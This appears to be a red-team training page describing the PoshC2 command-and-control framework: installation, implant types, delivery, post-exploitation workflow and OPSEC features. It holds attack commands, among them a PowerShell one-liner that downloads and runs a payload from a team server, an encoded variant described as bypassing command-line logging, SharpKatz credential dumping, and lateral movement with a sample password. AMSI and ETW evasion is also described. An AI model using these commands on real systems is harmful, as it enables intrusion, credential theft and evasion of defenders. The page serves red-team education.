---
layout: training-page
title: "PoshC2 — C2 Framework — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - poshc2
  - powershell
  - python
  - csharp
  - implant
  - opsec
page_key: "c2-poshc2"
render_with_liquid: false
---

# PoshC2

PoshC2 is an open-source, proxy-aware C2 framework by Nettitude. It is primarily written in Python3 with a modular implant architecture supporting PowerShell v2/v4, C#, C++, and Python2/Python3 payloads. It targets Windows, Linux, and macOS and is designed for red teaming, post-exploitation, and lateral movement.

Key capabilities:

- **Multiple implant types**: PowerShell (native AMSI bypass), C# (PowerShell-less), Python (cross-platform)
- **In-built AMSI bypass and ETW patching** in shellcode implants
- **HTTP(S) and SMB named-pipe** communications; Implant Daisy-chaining for air-gapped networks
- **Auto-generated Apache Rewrite rules** for C2 proxy/redirector protection
- **SharpSocks** SOCKS proxy included
- **Multi-user client/server** — multiple operators on a single team server
- **Configurable payloads**: beacon times, jitter, kill dates, user agents
- **Extensible**: add C#, PowerShell, or Python3 modules that run in-memory

## Install

### Docker (recommended)

```
git clone https://github.com/nettitude/PoshC2.git
cd PoshC2
docker build -t poshc2 .
docker run -it --rm -v $(pwd)/projects:/opt/PoshC2/projects poshc2
```

### Kali Direct Install

```
./Install.sh -b master -p /opt/PoshC2
```

`Install.sh` performs `apt` updates and installs Python dependencies. Elevated privileges required.

## Start the Server

```
# Start the C2 server (listens for implants):
python3 start.py

# In a separate terminal — start the ImplantHandler (operator interface):
posh -u <username>
```

PoshC2 separates the server process (listener + payload handler) from the ImplantHandler (operator terminal). Multiple operators connect to the same server via `posh`.

## Implant Types

| Implant | Language | Use Case |
|---------|----------|----------|
| **PowerShell** | PS v2/v4 | Default Windows target; AMSI bypass + ETW patch built in |
| **C# (Sharp)** | C# | PowerShell-less; avoids `System.Management.Automation.dll` EDR hooks |
| **Python** | Python 2/3 | Linux, macOS, Windows with Python installed |
| **C++** | C++ | Shellcode loader; raw PE or DLL delivery |
| **HTA** | HTML/JScript | Browser-based initial access |
| **Raw shellcode** | — | Inject into any loader via `execute-shellcode` |

### PowerShell Implant Delivery

```
# PoshC2 generates a one-liner at server start:
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://TEAMSERVER/connect')"

# Or via encoded command to bypass command-line logging:
powershell -nop -enc <base64_payload>
```

### C# / Sharp Implant

The Sharp implant is the recommended PowerShell-less path. It avoids loading `System.Management.Automation.dll` — a common EDR hook point — by running commands via `Syscall` or direct .NET API calls.

```
# In ImplantHandler, after a Sharp implant checks in:
sharp> run-exe PoshC2.Sharp.Modules.Net NetRecon
sharp> run-dll SharpSocks.dll SharpSocks.SocksProxy.Start
```

## Operational Workflow

```
# 1. Deploy initial payload (PowerShell one-liner, HTA, or shellcode)
# 2. Implant checks in — appears in ImplantHandler:
#    [+] New implant: PoshC2-PS WORKSTATION01\jsmith (PID 4812)

# 3. Interact with implant:
posh -u operator1

# 4. Run post-exploitation modules:
sharp> loadmodule Seatbelt.exe
sharp> run-exe Seatbelt.Seatbelt -group=all

# 5. Lateral movement via daisy-chaining (SMB named pipe):
sharp> create-beacon INTERNAL_HOST 445 smb
```

## Daisy-Chaining (Air-Gapped Networks)

```
# Agent on internet-facing host acts as a proxy:
# External host → SMB pipe → Internal host → SMB pipe → deeper host

# Configure: set the internal implant to route through the external one
sharp> set-proxy EXTERNAL_IMPLANT_ID smb INTERNAL_HOST
```

HTTP(S) and SMB named-pipe communications can be chained so implants in network segments without internet access route their C2 traffic through implants that do.

## OPSEC Features

- **AMSI bypass**: shellcode implants include a built-in AMSI bypass at execution
- **ETW patching**: ETW event provider patched in-process at startup
- **Encrypted comms**: all traffic encrypted even over HTTP (not relying solely on TLS)
- **Auto Apache Rewrite rules**: generated at server start for redirector deployment
- **Jitter and kill dates**: configurable per payload at generation time
- **Logging**: every action and response timestamped and stored in SQLite

## Key Modules

```
# Credential access:
sharp> run-exe SharpKatz.SharpKatz --Command logonpasswords

# Enumeration:
sharp> run-exe Seatbelt.Seatbelt -group=user
sharp> run-exe SharpHound.SharpHound -c all

# Lateral movement:
sharp> invoke-wmijack REMOTE_HOST administrator Password1

# SOCKS proxy:
sharp> run-dll SharpSocks.dll SharpSocks.SocksProxy.Start -Uri http://TEAMSERVER/
```

## Resources

- PoshC2 GitHub — `github.com/nettitude/PoshC2`
- Documentation — `poshc2.readthedocs.io`
- [SharpSocks](https://github.com/nettitude/SharpSocks) — built-in SOCKS proxy
- [Nettitude Labs blog](https://labs.nettitude.com/) — PoshC2 release posts
